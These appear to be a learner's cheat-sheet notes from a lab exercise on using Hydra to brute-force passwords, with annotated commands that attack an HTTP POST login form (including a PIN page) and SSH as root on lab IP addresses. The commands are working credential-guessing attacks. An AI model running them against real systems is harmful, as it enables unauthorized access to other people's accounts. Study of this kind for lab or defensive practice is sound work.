#### Post Web Form
- `sudo hydra <username> <wordlist> 10.201.20.240 http-post-form "<path>:<login_credentials>:<invalid_response>"`
- example: `hydra -l <username> -P <wordlist> 10.201.20.240 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
- example: `hydra -l '' -P 3digits.txt -f -v 10.201.108.168 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`
	- `-l ''` indicates that the login name is blank as the security lock only requires a password (username), `-L` là 1 danh sách username
    - `-P 3digits.txt` specifies the password file to use
    - `-f` stops Hydra after finding a working password
    - `-v` provides verbose output and is helpful for catching errors
    - `10.201.108.168` is the IP address of the target
    - `http-post-form `specifies the HTTP method to use
    - `"/login.php:pin=^PASS^:Access denied" `has three parts separated by :
	    - /`login.php` is the page where the PIN code is submitted
        - `pin=^PASS^` will replace `^PASS^` with values from the password list
        - `Access denied `indicates that invalid passwords will lead to a page that contains the text “Access denied”
    - `-s 8000` indicates the port number on the target
#### SSH
- `hydra -l <username> -P <full path to pass> 10.201.20.240 -t 4 ssh`
	- `-l`: specifies the (SSH) username for login
	- `-P`: indicates a list of passwords
	- `-t`: sets the number of threads to spawn
- example: `hydra -l root -P passwords.txt 10.201.20.240 -t 4 ssh`

